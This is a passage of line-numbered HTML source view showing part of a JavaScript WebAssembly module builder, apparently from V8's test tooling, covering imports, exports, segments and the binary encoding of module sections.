type_index = (typeof type) == 'number' ? type : this.addType(type);</td></tr><tr><td class="line-number" value="1631"></td><td class="line-content">    let o = {</td></tr><tr><td class="line-number" value="1632"></td><td class="line-content">      module: module,</td></tr><tr><td class="line-number" value="1633"></td><td class="line-content">      name: name,</td></tr><tr><td class="line-number" value="1634"></td><td class="line-content">      kind: kExternalTag,</td></tr><tr><td class="line-number" value="1635"></td><td class="line-content">      type_index: type_index</td></tr><tr><td class="line-number" value="1636"></td><td class="line-content">    };</td></tr><tr><td class="line-number" value="1637"></td><td class="line-content">    this.imports.push(o);</td></tr><tr><td class="line-number" value="1638"></td><td class="line-content">    return this.num_imported_tags++;</td></tr><tr><td class="line-number" value="1639"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1640"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1641"></td><td class="line-content">  addExport(name, index) {</td></tr><tr><td class="line-number" value="1642"></td><td class="line-content">    this.exports.push({name: name, kind: kExternalFunction, index: index});</td></tr><tr><td class="line-number" value="1643"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1644"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1645"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1646"></td><td class="line-content">  addExportOfKind(name, kind, index) {</td></tr><tr><td class="line-number" value="1647"></td><td class="line-content">    if (index === undefined &amp;&amp; kind != kExternalTable &amp;&amp;</td></tr><tr><td class="line-number" value="1648"></td><td class="line-content">        kind != kExternalMemory) {</td></tr><tr><td class="line-number" value="1649"></td><td class="line-content">      throw new Error(</td></tr><tr><td class="line-number" value="1650"></td><td class="line-content">          'Index for exports other than tables/memories must be provided');</td></tr><tr><td class="line-number" value="1651"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1652"></td><td class="line-content">    if (index !== undefined &amp;&amp; (typeof index) != 'number') {</td></tr><tr><td class="line-number" value="1653"></td><td class="line-content">      throw new Error('Index for exports must be a number')</td></tr><tr><td class="line-number" value="1654"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1655"></td><td class="line-content">    this.exports.push({name: name, kind: kind, index: index});</td></tr><tr><td class="line-number" value="1656"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1657"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1658"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1659"></td><td class="line-content">  setCompilationHint(strategy, baselineTier, topTier, index) {</td></tr><tr><td class="line-number" value="1660"></td><td class="line-content">    this.compilation_hints[index] = {</td></tr><tr><td class="line-number" value="1661"></td><td class="line-content">      strategy: strategy,</td></tr><tr><td class="line-number" value="1662"></td><td class="line-content">      baselineTier: baselineTier,</td></tr><tr><td class="line-number" value="1663"></td><td class="line-content">      topTier: topTier</td></tr><tr><td class="line-number" value="1664"></td><td class="line-content">    };</td></tr><tr><td class="line-number" value="1665"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1666"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1667"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1668"></td><td class="line-content">  addActiveDataSegment(memory_index, offset, data, is_shared = false) {</td></tr><tr><td class="line-number" value="1669"></td><td class="line-content">    checkExpr(offset);</td></tr><tr><td class="line-number" value="1670"></td><td class="line-content">    this.data_segments.push({</td></tr><tr><td class="line-number" value="1671"></td><td class="line-content">      is_active: true,</td></tr><tr><td class="line-number" value="1672"></td><td class="line-content">      is_shared: is_shared,</td></tr><tr><td class="line-number" value="1673"></td><td class="line-content">      mem_index: memory_index,</td></tr><tr><td class="line-number" value="1674"></td><td class="line-content">      offset: offset,</td></tr><tr><td class="line-number" value="1675"></td><td class="line-content">      data: data</td></tr><tr><td class="line-number" value="1676"></td><td class="line-content">    });</td></tr><tr><td class="line-number" value="1677"></td><td class="line-content">    return this.data_segments.length - 1;</td></tr><tr><td class="line-number" value="1678"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1679"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1680"></td><td class="line-content">  addPassiveDataSegment(data, is_shared = false) {</td></tr><tr><td class="line-number" value="1681"></td><td class="line-content">    this.data_segments.push({</td></tr><tr><td class="line-number" value="1682"></td><td class="line-content">      is_active: false, is_shared: is_shared, data: data});</td></tr><tr><td class="line-number" value="1683"></td><td class="line-content">    return this.data_segments.length - 1;</td></tr><tr><td class="line-number" value="1684"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1685"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1686"></td><td class="line-content">  exportMemoryAs(name, memory_index) {</td></tr><tr><td class="line-number" value="1687"></td><td class="line-content">    if (memory_index === undefined) {</td></tr><tr><td class="line-number" value="1688"></td><td class="line-content">      const num_memories = this.memories.length +</td></tr><tr><td class="line-number" value="1689"></td><td class="line-content">          this.imports.filter(i =&gt; i.kind == kExternalMemory).length;</td></tr><tr><td class="line-number" value="1690"></td><td class="line-content">      if (num_memories !== 1) {</td></tr><tr><td class="line-number" value="1691"></td><td class="line-content">        throw new Error(</td></tr><tr><td class="line-number" value="1692"></td><td class="line-content">            'Pass memory index to \'exportMemoryAs\' if there is not exactly ' +</td></tr><tr><td class="line-number" value="1693"></td><td class="line-content">            'one memory imported or declared.');</td></tr><tr><td class="line-number" value="1694"></td><td class="line-content">      }</td></tr><tr><td class="line-number" value="1695"></td><td class="line-content">      memory_index = 0;</td></tr><tr><td class="line-number" value="1696"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1697"></td><td class="line-content">    this.exports.push({name: name, kind: kExternalMemory, index: memory_index});</td></tr><tr><td class="line-number" value="1698"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1699"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1700"></td><td class="line-content">  // {offset} is a constant expression.</td></tr><tr><td class="line-number" value="1701"></td><td class="line-content">  // If {type} is undefined, then {elements} are function indices. Otherwise,</td></tr><tr><td class="line-number" value="1702"></td><td class="line-content">  // they are constant expressions.</td></tr><tr><td class="line-number" value="1703"></td><td class="line-content">  addActiveElementSegment(table, offset, elements, type) {</td></tr><tr><td class="line-number" value="1704"></td><td class="line-content">    checkExpr(offset);</td></tr><tr><td class="line-number" value="1705"></td><td class="line-content">    if (type != undefined) {</td></tr><tr><td class="line-number" value="1706"></td><td class="line-content">      for (let element of elements) checkExpr(element);</td></tr><tr><td class="line-number" value="1707"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1708"></td><td class="line-content">    this.element_segments.push(</td></tr><tr><td class="line-number" value="1709"></td><td class="line-content">        new WasmElemSegment(table, offset, type, elements, false));</td></tr><tr><td class="line-number" value="1710"></td><td class="line-content">    return this.element_segments.length - 1;</td></tr><tr><td class="line-number" value="1711"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1712"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1713"></td><td class="line-content">  // If {type} is undefined, then {elements} are function indices. Otherwise,</td></tr><tr><td class="line-number" value="1714"></td><td class="line-content">  // they are constant expressions.</td></tr><tr><td class="line-number" value="1715"></td><td class="line-content">  addPassiveElementSegment(elements, type) {</td></tr><tr><td class="line-number" value="1716"></td><td class="line-content">    if (type != undefined) {</td></tr><tr><td class="line-number" value="1717"></td><td class="line-content">      for (let element of elements) checkExpr(element);</td></tr><tr><td class="line-number" value="1718"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1719"></td><td class="line-content">    this.element_segments.push(</td></tr><tr><td class="line-number" value="1720"></td><td class="line-content">      new WasmElemSegment(undefined, undefined, type, elements, false));</td></tr><tr><td class="line-number" value="1721"></td><td class="line-content">    return this.element_segments.length - 1;</td></tr><tr><td class="line-number" value="1722"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1723"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1724"></td><td class="line-content">  // If {type} is undefined, then {elements} are function indices. Otherwise,</td></tr><tr><td class="line-number" value="1725"></td><td class="line-content">  // they are constant expressions.</td></tr><tr><td class="line-number" value="1726"></td><td class="line-content">  addDeclarativeElementSegment(elements, type) {</td></tr><tr><td class="line-number" value="1727"></td><td class="line-content">    if (type != undefined) {</td></tr><tr><td class="line-number" value="1728"></td><td class="line-content">      for (let element of elements) checkExpr(element);</td></tr><tr><td class="line-number" value="1729"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1730"></td><td class="line-content">    this.element_segments.push(</td></tr><tr><td class="line-number" value="1731"></td><td class="line-content">      new WasmElemSegment(undefined, undefined, type, elements, true));</td></tr><tr><td class="line-number" value="1732"></td><td class="line-content">    return this.element_segments.length - 1;</td></tr><tr><td class="line-number" value="1733"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1734"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1735"></td><td class="line-content">  appendToTable(array) {</td></tr><tr><td class="line-number" value="1736"></td><td class="line-content">    for (let n of array) {</td></tr><tr><td class="line-number" value="1737"></td><td class="line-content">      if (typeof n != 'number')</td></tr><tr><td class="line-number" value="1738"></td><td class="line-content">        throw new Error('invalid table (entries have to be numbers): ' + array);</td></tr><tr><td class="line-number" value="1739"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1740"></td><td class="line-content">    if (this.tables.length == 0) {</td></tr><tr><td class="line-number" value="1741"></td><td class="line-content">      this.addTable(kWasmAnyFunc, 0);</td></tr><tr><td class="line-number" value="1742"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1743"></td><td class="line-content">    // Adjust the table to the correct size.</td></tr><tr><td class="line-number" value="1744"></td><td class="line-content">    let table = this.tables[0];</td></tr><tr><td class="line-number" value="1745"></td><td class="line-content">    const base = table.initial_size;</td></tr><tr><td class="line-number" value="1746"></td><td class="line-content">    const table_size = base + array.length;</td></tr><tr><td class="line-number" value="1747"></td><td class="line-content">    table.initial_size = table_size;</td></tr><tr><td class="line-number" value="1748"></td><td class="line-content">    if (table.has_max &amp;&amp; table_size &gt; table.max_size) {</td></tr><tr><td class="line-number" value="1749"></td><td class="line-content">      table.max_size = table_size;</td></tr><tr><td class="line-number" value="1750"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1751"></td><td class="line-content">    return this.addActiveElementSegment(0, wasmI32Const(base), array);</td></tr><tr><td class="line-number" value="1752"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1753"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1754"></td><td class="line-content">  setTableBounds(min, max = undefined) {</td></tr><tr><td class="line-number" value="1755"></td><td class="line-content">    if (this.tables.length != 0) {</td></tr><tr><td class="line-number" value="1756"></td><td class="line-content">      throw new Error('The table bounds of table \'0\' have already been set.');</td></tr><tr><td class="line-number" value="1757"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1758"></td><td class="line-content">    this.addTable(kWasmAnyFunc, min, max);</td></tr><tr><td class="line-number" value="1759"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1760"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1761"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1762"></td><td class="line-content">  startRecGroup() {</td></tr><tr><td class="line-number" value="1763"></td><td class="line-content">    this.rec_groups.push({start: this.types.length, size: 0});</td></tr><tr><td class="line-number" value="1764"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1765"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1766"></td><td class="line-content">  endRecGroup() {</td></tr><tr><td class="line-number" value="1767"></td><td class="line-content">    if (this.rec_groups.length == 0) {</td></tr><tr><td class="line-number" value="1768"></td><td class="line-content">      throw new Error("Did not start a recursive group before ending one")</td></tr><tr><td class="line-number" value="1769"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1770"></td><td class="line-content">    let last_element = this.rec_groups[this.rec_groups.length - 1]</td></tr><tr><td class="line-number" value="1771"></td><td class="line-content">    if (last_element.size != 0) {</td></tr><tr><td class="line-number" value="1772"></td><td class="line-content">      throw new Error("Did not start a recursive group before ending one")</td></tr><tr><td class="line-number" value="1773"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1774"></td><td class="line-content">    last_element.size = this.types.length - last_element.start;</td></tr><tr><td class="line-number" value="1775"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1776"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1777"></td><td class="line-content">  setName(name) {</td></tr><tr><td class="line-number" value="1778"></td><td class="line-content">    this.name = name;</td></tr><tr><td class="line-number" value="1779"></td><td class="line-content">    return this;</td></tr><tr><td class="line-number" value="1780"></td><td class="line-content">  }</td></tr><tr><td class="line-number" value="1781"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1782"></td><td class="line-content">  toBuffer(debug = false) {</td></tr><tr><td class="line-number" value="1783"></td><td class="line-content">    let binary = new Binary;</td></tr><tr><td class="line-number" value="1784"></td><td class="line-content">    let wasm = this;</td></tr><tr><td class="line-number" value="1785"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1786"></td><td class="line-content">    // Add header.</td></tr><tr><td class="line-number" value="1787"></td><td class="line-content">    binary.emit_header();</td></tr><tr><td class="line-number" value="1788"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1789"></td><td class="line-content">    // Add type section.</td></tr><tr><td class="line-number" value="1790"></td><td class="line-content">    if (wasm.types.length &gt; 0) {</td></tr><tr><td class="line-number" value="1791"></td><td class="line-content">      if (debug) print('emitting types @ ' + binary.length);</td></tr><tr><td class="line-number" value="1792"></td><td class="line-content">      binary.emit_section(kTypeSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1793"></td><td class="line-content">        let length_with_groups = wasm.types.length;</td></tr><tr><td class="line-number" value="1794"></td><td class="line-content">        for (let group of wasm.rec_groups) {</td></tr><tr><td class="line-number" value="1795"></td><td class="line-content">          length_with_groups -= group.size - 1;</td></tr><tr><td class="line-number" value="1796"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1797"></td><td class="line-content">        section.emit_u32v(length_with_groups);</td></tr><tr><td class="line-number" value="1798"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1799"></td><td class="line-content">        let rec_group_index = 0;</td></tr><tr><td class="line-number" value="1800"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1801"></td><td class="line-content">        for (let i = 0; i &lt; wasm.types.length; i++) {</td></tr><tr><td class="line-number" value="1802"></td><td class="line-content">          if (rec_group_index &lt; wasm.rec_groups.length &amp;&amp;</td></tr><tr><td class="line-number" value="1803"></td><td class="line-content">              wasm.rec_groups[rec_group_index].start == i) {</td></tr><tr><td class="line-number" value="1804"></td><td class="line-content">            section.emit_u8(kWasmRecursiveTypeGroupForm);</td></tr><tr><td class="line-number" value="1805"></td><td class="line-content">            section.emit_u32v(wasm.rec_groups[rec_group_index].size);</td></tr><tr><td class="line-number" value="1806"></td><td class="line-content">            rec_group_index++;</td></tr><tr><td class="line-number" value="1807"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="1808"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1809"></td><td class="line-content">          let type = wasm.types[i];</td></tr><tr><td class="line-number" value="1810"></td><td class="line-content">          if (type.supertype != kNoSuperType) {</td></tr><tr><td class="line-number" value="1811"></td><td class="line-content">            section.emit_u8(type.is_final ? kWasmSubtypeFinalForm</td></tr><tr><td class="line-number" value="1812"></td><td class="line-content">                                          : kWasmSubtypeForm);</td></tr><tr><td class="line-number" value="1813"></td><td class="line-content">            section.emit_u8(1);  // supertype count</td></tr><tr><td class="line-number" value="1814"></td><td class="line-content">            section.emit_u32v(type.supertype);</td></tr><tr><td class="line-number" value="1815"></td><td class="line-content">          } else if (!type.is_final) {</td></tr><tr><td class="line-number" value="1816"></td><td class="line-content">            section.emit_u8(kWasmSubtypeForm);</td></tr><tr><td class="line-number" value="1817"></td><td class="line-content">            section.emit_u8(0);  // no supertypes</td></tr><tr><td class="line-number" value="1818"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="1819"></td><td class="line-content">          if (type.is_shared) section.emit_u8(kWasmSharedTypeForm);</td></tr><tr><td class="line-number" value="1820"></td><td class="line-content">          if (type instanceof WasmStruct) {</td></tr><tr><td class="line-number" value="1821"></td><td class="line-content">            section.emit_u8(kWasmStructTypeForm);</td></tr><tr><td class="line-number" value="1822"></td><td class="line-content">            section.emit_u32v(type.fields.length);</td></tr><tr><td class="line-number" value="1823"></td><td class="line-content">            for (let field of type.fields) {</td></tr><tr><td class="line-number" value="1824"></td><td class="line-content">              section.emit_type(field.type);</td></tr><tr><td class="line-number" value="1825"></td><td class="line-content">              section.emit_u8(field.mutability ? 1 : 0);</td></tr><tr><td class="line-number" value="1826"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="1827"></td><td class="line-content">          } else if (type instanceof WasmArray) {</td></tr><tr><td class="line-number" value="1828"></td><td class="line-content">            section.emit_u8(kWasmArrayTypeForm);</td></tr><tr><td class="line-number" value="1829"></td><td class="line-content">            section.emit_type(type.type);</td></tr><tr><td class="line-number" value="1830"></td><td class="line-content">            section.emit_u8(type.mutability ? 1 : 0);</td></tr><tr><td class="line-number" value="1831"></td><td class="line-content">          } else {</td></tr><tr><td class="line-number" value="1832"></td><td class="line-content">            section.emit_u8(kWasmFunctionTypeForm);</td></tr><tr><td class="line-number" value="1833"></td><td class="line-content">            section.emit_u32v(type.params.length);</td></tr><tr><td class="line-number" value="1834"></td><td class="line-content">            for (let param of type.params) {</td></tr><tr><td class="line-number" value="1835"></td><td class="line-content">              section.emit_type(param);</td></tr><tr><td class="line-number" value="1836"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="1837"></td><td class="line-content">            section.emit_u32v(type.results.length);</td></tr><tr><td class="line-number" value="1838"></td><td class="line-content">            for (let result of type.results) {</td></tr><tr><td class="line-number" value="1839"></td><td class="line-content">              section.emit_type(result);</td></tr><tr><td class="line-number" value="1840"></td><td class="line-content">            }</td></tr><tr><td class="line-number" value="1841"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="1842"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1843"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1844"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1845"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1846"></td><td class="line-content">    // Add imports section.</td></tr><tr><td class="line-number" value="1847"></td><td class="line-content">    if (wasm.imports.length &gt; 0) {</td></tr><tr><td class="line-number" value="1848"></td><td class="line-content">      if (debug) print('emitting imports @ ' + binary.length);</td></tr><tr><td class="line-number" value="1849"></td><td class="line-content">      binary.emit_section(kImportSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1850"></td><td class="line-content">        section.emit_u32v(wasm.imports.length);</td></tr><tr><td class="line-number" value="1851"></td><td class="line-content">        for (let imp of wasm.imports) {</td></tr><tr><td class="line-number" value="1852"></td><td class="line-content">          section.emit_string(imp.module);</td></tr><tr><td class="line-number" value="1853"></td><td class="line-content">          section.emit_string(imp.name || '');</td></tr><tr><td class="line-number" value="1854"></td><td class="line-content">          section.emit_u8(imp.kind);</td></tr><tr><td class="line-number" value="1855"></td><td class="line-content">          if (imp.kind == kExternalFunction) {</td></tr><tr><td class="line-number" value="1856"></td><td class="line-content">            section.emit_u32v(imp.type_index);</td></tr><tr><td class="line-number" value="1857"></td><td class="line-content">          } else if (imp.kind == kExternalGlobal) {</td></tr><tr><td class="line-number" value="1858"></td><td class="line-content">            section.emit_type(imp.type);</td></tr><tr><td class="line-number" value="1859"></td><td class="line-content">            let flags = (imp.mutable ? 1 : 0) | (imp.shared ? 0b10 : 0);</td></tr><tr><td class="line-number" value="1860"></td><td class="line-content">            section.emit_u8(flags);</td></tr><tr><td class="line-number" value="1861"></td><td class="line-content">          } else if (imp.kind == kExternalMemory) {</td></tr><tr><td class="line-number" value="1862"></td><td class="line-content">            const has_max = imp.maximum !== undefined;</td></tr><tr><td class="line-number" value="1863"></td><td class="line-content">            const is_shared = !!imp.shared;</td></tr><tr><td class="line-number" value="1864"></td><td class="line-content">            const is_memory64 = !!imp.is_memory64;</td></tr><tr><td class="line-number" value="1865"></td><td class="line-content">            let limits_byte =</td></tr><tr><td class="line-number" value="1866"></td><td class="line-content">                (is_memory64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 : 0);</td></tr><tr><td class="line-number" value="1867"></td><td class="line-content">            section.emit_u8(limits_byte);</td></tr><tr><td class="line-number" value="1868"></td><td class="line-content">            let emit = val =&gt;</td></tr><tr><td class="line-number" value="1869"></td><td class="line-content">                is_memory64 ? section.emit_u64v(val) : section.emit_u32v(val);</td></tr><tr><td class="line-number" value="1870"></td><td class="line-content">            emit(imp.initial);</td></tr><tr><td class="line-number" value="1871"></td><td class="line-content">            if (has_max) emit(imp.maximum);</td></tr><tr><td class="line-number" value="1872"></td><td class="line-content">          } else if (imp.kind == kExternalTable) {</td></tr><tr><td class="line-number" value="1873"></td><td class="line-content">            section.emit_type(imp.type);</td></tr><tr><td class="line-number" value="1874"></td><td class="line-content">            var has_max = (typeof imp.maximum) != 'undefined';</td></tr><tr><td class="line-number" value="1875"></td><td class="line-content">            section.emit_u8(has_max ? 1 : 0);             // flags</td></tr><tr><td class="line-number" value="1876"></td><td class="line-content">            section.emit_u32v(imp.initial);               // initial</td></tr><tr><td class="line-number" value="1877"></td><td class="line-content">            if (has_max) section.emit_u32v(imp.maximum);  // maximum</td></tr><tr><td class="line-number" value="1878"></td><td class="line-content">          } else if (imp.kind == kExternalTag) {</td></tr><tr><td class="line-number" value="1879"></td><td class="line-content">            section.emit_u32v(kExceptionAttribute);</td></tr><tr><td class="line-number" value="1880"></td><td class="line-content">            section.emit_u32v(imp.type_index);</td></tr><tr><td class="line-number" value="1881"></td><td class="line-content">          } else {</td></tr><tr><td class="line-number" value="1882"></td><td class="line-content">            throw new Error('unknown/unsupported import kind ' + imp.kind);</td></tr><tr><td class="line-number" value="1883"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="1884"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1885"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1886"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1887"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1888"></td><td class="line-content">    // Add functions declarations.</td></tr><tr><td class="line-number" value="1889"></td><td class="line-content">    if (wasm.functions.length &gt; 0) {</td></tr><tr><td class="line-number" value="1890"></td><td class="line-content">      if (debug) print('emitting function decls @ ' + binary.length);</td></tr><tr><td class="line-number" value="1891"></td><td class="line-content">      binary.emit_section(kFunctionSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1892"></td><td class="line-content">        section.emit_u32v(wasm.functions.length);</td></tr><tr><td class="line-number" value="1893"></td><td class="line-content">        for (let func of wasm.functions) {</td></tr><tr><td class="line-number" value="1894"></td><td class="line-content">          section.emit_u32v(func.type_index);</td></tr><tr><td class="line-number" value="1895"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1896"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1897"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1898"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1899"></td><td class="line-content">    // Add table section.</td></tr><tr><td class="line-number" value="1900"></td><td class="line-content">    if (wasm.tables.length &gt; 0) {</td></tr><tr><td class="line-number" value="1901"></td><td class="line-content">      if (debug) print('emitting tables @ ' + binary.length);</td></tr><tr><td class="line-number" value="1902"></td><td class="line-content">      binary.emit_section(kTableSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1903"></td><td class="line-content">        section.emit_u32v(wasm.tables.length);</td></tr><tr><td class="line-number" value="1904"></td><td class="line-content">        for (let table of wasm.tables) {</td></tr><tr><td class="line-number" value="1905"></td><td class="line-content">          if (table.has_init) {</td></tr><tr><td class="line-number" value="1906"></td><td class="line-content">            section.emit_u8(0x40);  // "has initializer"</td></tr><tr><td class="line-number" value="1907"></td><td class="line-content">            section.emit_u8(0x00);  // Reserved byte.</td></tr><tr><td class="line-number" value="1908"></td><td class="line-content">          }</td></tr><tr><td class="line-number" value="1909"></td><td class="line-content">          section.emit_type(table.type);</td></tr><tr><td class="line-number" value="1910"></td><td class="line-content">          section.emit_u8(table.has_max);</td></tr><tr><td class="line-number" value="1911"></td><td class="line-content">          section.emit_u32v(table.initial_size);</td></tr><tr><td class="line-number" value="1912"></td><td class="line-content">          if (table.has_max) section.emit_u32v(table.max_size);</td></tr><tr><td class="line-number" value="1913"></td><td class="line-content">          if (table.has_init) section.emit_init_expr(table.init_expr);</td></tr><tr><td class="line-number" value="1914"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1915"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1916"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1917"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1918"></td><td class="line-content">    // Add memory section.</td></tr><tr><td class="line-number" value="1919"></td><td class="line-content">    if (wasm.memories.length &gt; 0) {</td></tr><tr><td class="line-number" value="1920"></td><td class="line-content">      if (debug) print('emitting memories @ ' + binary.length);</td></tr><tr><td class="line-number" value="1921"></td><td class="line-content">      binary.emit_section(kMemorySectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1922"></td><td class="line-content">        section.emit_u32v(wasm.memories.length);</td></tr><tr><td class="line-number" value="1923"></td><td class="line-content">        for (let memory of wasm.memories) {</td></tr><tr><td class="line-number" value="1924"></td><td class="line-content">          const has_max = memory.max !== undefined;</td></tr><tr><td class="line-number" value="1925"></td><td class="line-content">          const is_shared = !!memory.shared;</td></tr><tr><td class="line-number" value="1926"></td><td class="line-content">          const is_memory64 = !!memory.is_memory64;</td></tr><tr><td class="line-number" value="1927"></td><td class="line-content">          let limits_byte =</td></tr><tr><td class="line-number" value="1928"></td><td class="line-content">              (is_memory64 ? 4 : 0) | (is_shared ? 2 : 0) | (has_max ? 1 : 0);</td></tr><tr><td class="line-number" value="1929"></td><td class="line-content">          section.emit_u8(limits_byte);</td></tr><tr><td class="line-number" value="1930"></td><td class="line-content">          let emit = val =&gt;</td></tr><tr><td class="line-number" value="1931"></td><td class="line-content">              is_memory64 ? section.emit_u64v(val) : section.emit_u32v(val);</td></tr><tr><td class="line-number" value="1932"></td><td class="line-content">          emit(memory.min);</td></tr><tr><td class="line-number" value="1933"></td><td class="line-content">          if (has_max) emit(memory.max);</td></tr><tr><td class="line-number" value="1934"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1935"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1936"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1937"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1938"></td><td class="line-content">    // Add tag section.</td></tr><tr><td class="line-number" value="1939"></td><td class="line-content">    if (wasm.tags.length &gt; 0) {</td></tr><tr><td class="line-number" value="1940"></td><td class="line-content">      if (debug) print('emitting tags @ ' + binary.length);</td></tr><tr><td class="line-number" value="1941"></td><td class="line-content">      binary.emit_section(kTagSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1942"></td><td class="line-content">        section.emit_u32v(wasm.tags.length);</td></tr><tr><td class="line-number" value="1943"></td><td class="line-content">        for (let type_index of wasm.tags) {</td></tr><tr><td class="line-number" value="1944"></td><td class="line-content">          section.emit_u32v(kExceptionAttribute);</td></tr><tr><td class="line-number" value="1945"></td><td class="line-content">          section.emit_u32v(type_index);</td></tr><tr><td class="line-number" value="1946"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1947"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1948"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1949"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1950"></td><td class="line-content">    // Add stringref section.</td></tr><tr><td class="line-number" value="1951"></td><td class="line-content">    if (wasm.stringrefs.length &gt; 0) {</td></tr><tr><td class="line-number" value="1952"></td><td class="line-content">      if (debug) print('emitting stringrefs @ ' + binary.length);</td></tr><tr><td class="line-number" value="1953"></td><td class="line-content">      binary.emit_section(kStringRefSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1954"></td><td class="line-content">        section.emit_u32v(0);</td></tr><tr><td class="line-number" value="1955"></td><td class="line-content">        section.emit_u32v(wasm.stringrefs.length);</td></tr><tr><td class="line-number" value="1956"></td><td class="line-content">        for (let str of wasm.stringrefs) {</td></tr><tr><td class="line-number" value="1957"></td><td class="line-content">          section.emit_string(str);</td></tr><tr><td class="line-number" value="1958"></td><td class="line-content">        }</td></tr><tr><td class="line-number" value="1959"></td><td class="line-content">      });</td></tr><tr><td class="line-number" value="1960"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="1961"></td><td class="line-content">  </td></tr><tr><td class="line-number" value="1962"></td><td class="line-content">    // Add global section.</td></tr><tr><td class="line-number" value="1963"></td><td class="line-content">    if (wasm.globals.length &gt; 0) {</td></tr><tr><td class="line-number" value="1964"></td><td class="line-content">      if (debug) print('emitting globals @ ' + binary.length);</td></tr><tr><td class="line-number" value="1965"></td><td class="line-content">      binary.emit_section(kGlobalSectionCode, section =&gt; {</td></tr><tr><td class="line-number" value="1966"></td><td class="line-content">        section.emit_u32v(wasm.globals.length);</td></tr><tr><td class="line-number" value="1967"></td><td class="line-content">        for (let global of wasm.globals) {</td></tr><tr><td class="line-number" value="1968"></td><td class="line-content">          section.emit_type(global.type);</td></tr><tr><td class="line-number" value="1969"></td><td class="line-content">          section.emit_u8((global.mutable ? 1 : 0) | (global.shared ? 0b10 : 0));</td></tr><tr><td class="line-number" value="1970"></td><td class="line-content">          section.emit_init_expr(global.init);</td></tr><tr><td class="line-number" value="1971"></td><td class="line-content">        }</td></tr><tr><td 